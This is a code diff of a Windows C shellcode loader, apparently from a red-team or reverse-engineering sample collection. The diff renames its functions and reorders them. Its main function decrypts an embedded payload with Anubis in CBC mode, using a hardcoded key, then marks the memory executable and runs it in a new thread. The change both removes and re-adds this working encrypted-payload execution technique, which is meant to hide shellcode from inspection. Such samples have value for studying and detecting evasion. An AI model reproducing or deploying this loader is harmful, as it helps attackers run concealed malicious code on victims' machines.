@@ -15,7 +15,7 @@ Technique:
     - execution:  CreateThread
 
 Reference:
-    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/Anubis/Anubis.c
+    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/Anubis/code.c
 
 Note:
     - key size: 128-bit
@@ -35,7 +35,8 @@ Note:
 #define MIN_KEYSIZEB    (4 * MIN_N)
 #define MAX_KEYSIZEB    (4 * MAX_N)
 #define BLOCKSIZE       128
-#define BLOCKSIZEB      (BLOCKSIZE/8)
+#define BLOCKSIZEB      16
+#define KEYSIZE         128
 #define KEYSIZEB        16
 
 
@@ -462,96 +463,19 @@ typedef struct
 
 
 /* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
-void anubis_crypt(uint8_t val[16], const uint32_t rkeys[MAX_ROUNDS + 1][4], int R);
-void anubis_setup(anubis_t * config, uint8_t * secret);
+void key_setup(anubis_t * config, uint8_t * secret);
 
 
 /* *************************** HELPER FUNCTIONS *************************** */
-/* XOR 2 data block */
-void xor_block(char* dst, char * src1, char * src2)
+void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
 {
     register uint32_t i = 0;
-    for (i = 0; i < 16; i++)
+    for (i = 0; i < BLOCKSIZEB; i++)
         dst[i] = src1[i] ^ src2[i];
 }
 
 
-// Anubis decryption with CBC
-void decrypt(uint8_t * data, uint32_t size, uint8_t key[KEYSIZEB], uint8_t iv[16])
-{
-    anubis_t config;
-    uint32_t i;
-    uint8_t  prev_block[16];
-    uint8_t  cipher_block[16];
-
-    // setup configuration
-    config.bits = 128;
-    anubis_setup(&config, key);
-
-    memcpy(prev_block, iv, 16);
-    
-    for (i = 0; i < size; i += 16)
-    {
-        // copy to temporary block
-        memcpy(cipher_block, &data[i], 16);
-
-        // decrypt the block
-        anubis_crypt(&data[i], config.rkeys_dec, config.R);
-
-        // XOR the previous ciphertext with current ciphertext block
-        xor_block(&data[i], &data[i], prev_block);
-
-        // copy the current ciphertext as previous block
-        memcpy(prev_block, cipher_block, 16); 
-    }
-}
-
-
-int main ()
-{
-    void *  runtime;
-    BOOL    retval;
-    HANDLE  th_shellcode;
-    DWORD   old_protect = 0;
-
-    // shellcode storage in stack
-    // IV is embedded within, so we need to mark both payload and IV
-    uint8_t     payload []  = { 
-        0xc8, 0xe1, 0x77, 0xe8, 0xfa, 0x4b, 0x11, 0xac, 0x0f, 0x86, 0x0e, 0xa0, 0xb0, 0xae, 0x70, 0x43,
-        0xb0, 0x12, 0x9c, 0x42, 0x6f, 0x69, 0xbb, 0x8f, 0xe3, 0x69, 0x5f, 0xeb, 0x6a, 0x4a, 0x7a, 0xb6,
-        0xbc, 0x00, 0xc5, 0x2a, 0xe2, 0x29, 0x5d, 0x67, 0x6a, 0x0b, 0x3e, 0xe6, 0x6c, 0x48, 0x73, 0xe3 
-    };
-    uint32_t    payload_len = 32;
-    uint8_t*    iv = &payload[payload_len];
-
-    // secret-key 16-bytes or 128-bit
-    uint8_t     key[] = 
-            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
-    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
-              0x31, 0x33, 0x33, 0x37 };
-            /*  1     3     3     7  */
-
-    // allocate memory buffer for payload as READ-WRITE (no executable)
-    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    // decrypt data
-    RtlMoveMemory (runtime, payload, payload_len);
-    decrypt ((uint8_t*)runtime, payload_len, key, iv);
-    
-    // make buffer executable (R-X)
-    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
-    if (retval != 0)
-    {
-        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
-        WaitForSingleObject (th_shellcode, -1);
-    }
-
-    VirtualFree (runtime, payload_len, MEM_RELEASE);
-
-    return 0;
-}
-
-void anubis_crypt(uint8_t val[16], const uint32_t rkeys[MAX_ROUNDS + 1][4], int R)
+void block_decrypt(uint8_t val[BLOCKSIZEB], const uint32_t rkeys[MAX_ROUNDS + 1][4], int R)
 {
     int i, pos, r;
     uint32_t state[4];
@@ -640,7 +564,84 @@ void anubis_crypt(uint8_t val[16], const uint32_t rkeys[MAX_ROUNDS + 1][4], int 
     }
 }
 
-void anubis_setup(anubis_t * config, uint8_t * secret)
+// Anubis decryption with CBC
+void decrypt(uint8_t * data, uint32_t size, uint8_t key[KEYSIZEB], uint8_t iv[16])
+{
+    anubis_t config;
+    uint32_t i;
+    uint8_t  prev_block[BLOCKSIZEB];
+    uint8_t  cipher_block[BLOCKSIZEB];
+
+    // setup configuration
+    config.bits = 128;
+    key_setup(&config, key);
+
+    memcpy(prev_block, iv, BLOCKSIZEB);
+    
+    for (i = 0; i < size; i += BLOCKSIZEB)
+    {
+        // copy to temporary block
+        memcpy(cipher_block, &data[i], BLOCKSIZEB);
+
+        // decrypt the block
+        block_decrypt(&data[i], config.rkeys_dec, config.R);
+
+        // XOR the previous ciphertext with current ciphertext block
+        xor_block(&data[i], &data[i], prev_block);
+
+        // copy the current ciphertext as previous block
+        memcpy(prev_block, cipher_block, BLOCKSIZEB); 
+    }
+}
+
+
+int main ()
+{
+    void *  runtime;
+    BOOL    retval;
+    HANDLE  th_shellcode;
+    DWORD   old_protect = 0;
+
+    // shellcode storage in stack
+    // IV is embedded within, so we need to mark both payload and IV
+    uint8_t     payload []  = { 
+        0xc8, 0xe1, 0x77, 0xe8, 0xfa, 0x4b, 0x11, 0xac, 0x0f, 0x86, 0x0e, 0xa0, 0xb0, 0xae, 0x70, 0x43,
+        0xb0, 0x12, 0x9c, 0x42, 0x6f, 0x69, 0xbb, 0x8f, 0xe3, 0x69, 0x5f, 0xeb, 0x6a, 0x4a, 0x7a, 0xb6,
+        0xbc, 0x00, 0xc5, 0x2a, 0xe2, 0x29, 0x5d, 0x67, 0x6a, 0x0b, 0x3e, 0xe6, 0x6c, 0x48, 0x73, 0xe3 
+    };
+    uint32_t    payload_len = 32;
+    uint8_t*    iv = &payload[payload_len];
+
+    // secret-key 16-bytes or 128-bit
+    uint8_t     key[] = 
+            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
+    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
+              0x31, 0x33, 0x33, 0x37 };
+            /*  1     3     3     7  */
+
+    // allocate memory buffer for payload as READ-WRITE (no executable)
+    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // decrypt data
+    RtlMoveMemory (runtime, payload, payload_len);
+    decrypt ((uint8_t*)runtime, payload_len, key, iv);
+    
+    // make buffer executable (R-X)
+    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
+    if (retval != 0)
+    {
+        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
+        WaitForSingleObject (th_shellcode, -1);
+    }
+
+    VirtualFree (runtime, payload_len, MEM_RELEASE);
+
+    return 0;
+}
+
+
+/* ********************* INTERNAL FUNCTIONS IMPLEMENTATION ********************* */
+void key_setup(anubis_t * config, uint8_t * secret)
 {
     int N, R, i, pos, r;
     uint32_t kappa[MAX_N];
